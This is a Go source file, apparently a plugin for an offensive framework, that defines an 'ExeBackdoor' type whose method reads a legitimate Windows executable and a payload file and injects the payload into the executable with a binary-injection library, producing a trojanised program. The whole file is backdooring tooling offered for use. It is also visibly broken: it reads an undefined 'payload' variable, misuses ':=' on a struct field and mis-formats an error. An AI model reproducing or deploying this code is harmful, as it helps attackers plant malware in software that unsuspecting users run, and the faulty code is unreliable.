package runner

//This should be built into a .dll or .so
import (
  "fmt"
  "io/ioutil"
  "github.com/Binject/binjection/bj"
  "github.com/alphamystic/wheagle/components/orca"
)

/* For future implementations, an all will be exported for the default
type AllBackdoors struct {
  ExeBD *ExeBackdoor
}

func (ab *AllBackdoors) Default(filetype,legitfile,targetfile,payloadfile string) (*Backdoored,error){
  //select the filetype
  //call its related method
  return nil,nil
}

func New()(*orca.Backdoored,error){
  return new(AllBackdoors)
}
*/
/* Ignore this for now */
//build this into a .dll or .so and load it
type ExeBackdoor struct{}

func (eb *ExeBackdoor) BDExe(legitfile,targetfile string) (*orca.Backdoored,error){
  var (
    err error
    bdRes *orca.Backdoored
  )
  bdRes = new(orca.Backdoored)
  inputData,err := ioutil.ReadFile(legitfile)
  if err != nil{
    return bdRes,fmt.Errorf("Error reading the legitimate file")
  }
  payload,err := ioutil.ReadFile(payload)
  if err != nil{
    return bdRes,fmt.Errorf("Error reading the payload file")
  }
  bdRes.Data,err := bj.PeBinject(inputData,payload,&bj.BinjectConfig{
    InjectionMethod:bj.PE,
  })
  if err != nil {
    return bdRes,fmt.Errorf("Error injecting into file: ",err)
  }
  return bdRes,nil
}

//You can't return a pointer as we are returning an uninitialised function
// which is initialized by the exebackdoor at runtime
func New() orca.BACKDOOR{
  return new(ExeBackdoor)
}
